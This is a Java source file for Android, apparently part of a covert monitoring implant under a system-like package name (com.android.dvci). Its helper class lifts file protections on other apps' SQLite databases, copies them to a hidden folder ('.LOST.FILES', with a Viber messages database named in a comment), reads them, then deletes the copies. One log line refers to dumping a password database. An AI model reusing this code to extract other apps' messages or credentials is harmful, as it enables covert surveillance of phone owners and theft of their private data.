package com.android.dvci.db;

import java.io.File;
import java.io.IOException;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.dvci.auto.Cfg;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

/**
 * Helper to access sqlite db.
 * 
 * @author zeno
 * @param <T>
 * 
 */
public class GenericSqliteHelper { // extends SQLiteOpenHelper {
	private static final String TAG = "GenericSqliteHelper";
	private static final int DB_VERSION = 4;
	public static Object lockObject = new Object();
	private String name = null;
	private SQLiteDatabase db;
	public boolean deleteAtEnd = false;
	private boolean isCopy = false;

	private GenericSqliteHelper(String name, boolean isCopy) {
		this.name = name;
		this.deleteAtEnd = isCopy;
		this.isCopy = isCopy;
	}

	public GenericSqliteHelper(SQLiteDatabase db) {
		this.db = db;

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper open(String dbFile) {
		File fs = new File(dbFile);
		return open(fs);
	}

	public static GenericSqliteHelper open(String databasePath, String dbfile) {
		File fs = new File(databasePath, dbfile);
		return open(fs);
	}

	private static GenericSqliteHelper open(File fs) {
		String dbFile = fs.getAbsolutePath();
		if (fs.exists() && Path.unprotect(dbFile, 4, false)) {
			return new GenericSqliteHelper(dbFile, false);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: no suitable db file");
			}
			return null;
		}

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param dbFile
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String dbFile) {

		File fs = new File(dbFile);
		dbFile = fs.getAbsolutePath();
		if (!(Path.unprotect(dbFile, 4, false) && fs.exists() && fs.canRead())) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openCopy) ERROR: no suitable db file");
			}
			return null;
		}

		String localFile = Path.markup() + fs.getName();
		try {
			Utils.copy(new File(dbFile), new File(localFile));
		} catch (IOException e) {
			return null;
		}
		
		return new GenericSqliteHelper(localFile, true);

	}

	/**
	 * Copy the db in a temp directory and opens it
	 * 
	 * @param pathSystem
	 * @param file
	 * @return
	 */
	public static GenericSqliteHelper openCopy(String pathSystem, String file) {
		return openCopy(new File(pathSystem, file).getAbsolutePath());
	}

	/*
	 * @Override public void onCreate(SQLiteDatabase db) { }
	 * 
	 * @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int
	 * newVersion) { if (Cfg.DEBUG) { Check.log(TAG + " (onUpgrade), old: " +
	 * oldVersion); } }
	 */

	public long traverseRawQuery(String sqlquery, String[] selectionArgs, RecordVisitor visitor) {
		synchronized (lockObject) {
			db = getReadableDatabase();
			Cursor cursor = db.rawQuery(sqlquery, selectionArgs);

			long ret = traverse(cursor, visitor, new String[] {});

			cursor.close();
			cursor = null;

			if (this.db != null) {
				db.close();
				db = null;
			}
			return ret;
		}
	}

	/**
	 * Traverse all the records of a table on a projection. Visitor pattern
	 * implementation
	 * 
	 * @param table
	 * @param projection
	 * @param selection
	 * @param visitor
	 */
	public long traverseRecords(String table, RecordVisitor visitor, boolean closeDB) {
		synchronized (lockObject) {
			db = getReadableDatabase();
			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();

			queryBuilderIndex.setTables(table);
			Cursor cursor = queryBuilderIndex.query(db, visitor.getProjection(), visitor.getSelection(), null, null,
					null, visitor.getOrder());

			long ret = traverse(cursor, visitor, new String[] { table });

			cursor.close();
			cursor = null;

			if (closeDB && this.db != null) {
				db.close();
				db = null;
			}
			return ret;
		}
	}
	
	public long traverseRecords(String table, RecordVisitor visitor) {
		return traverseRecords(table, visitor, true);
	}

	private long traverse(Cursor cursor, RecordVisitor visitor, String[] tables) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (traverseRecords)");
		}
		visitor.init(tables, cursor.getCount());

		long maxid = 0;
		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext() && !visitor.isStopRequested()) {
			long id = visitor.cursor(cursor);
			maxid = Math.max(id, maxid);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (traverseRecords) maxid: " + maxid);
		}

		visitor.close();

		if (this.deleteAtEnd) {
			File file = new File(this.name);
			file.delete();
		}

		return maxid;

	}

	public SQLiteDatabase getReadableDatabase() {
		if (db != null && db.isOpen()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) already opened");
			}
			return db;
		}
		try {
			Path.unprotect(name, 3, true);
			Path.unprotect(name + "-journal", true);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) open");
			}
			// TODO: verificare se sia possibile evitare i log:
			// 06-17 11:13:17.726: E/SqliteDatabaseCpp(10522):
			// sqlite3_open_v2("/mnt/sdcard/.LOST.FILES/mdd/viber_messages",
			// &handle, 1, NULL) failed
			// 06-17 11:13:17.742: E/SQLiteDatabase(10522): Failed to open the
			// database. closing it.
			// 06-17 11:13:17.742: E/SQLiteDatabase(10522):
			// android.database.sqlite.SQLiteCantOpenDatabaseException: unable
			// to open database file

			AutoFile file = new AutoFile(name);
			if (file.exists()) {
				SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
						| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
				return opened;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getReadableDatabase) Error: file does not exists");
				}
			}
		} catch (Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getReadableDatabase) Error: " + ex);
			}
		}

		return null;
	}

	public void deleteDb() {
		if (isCopy) {
			File file = new File(this.name);
			file.delete();
		}

	}

}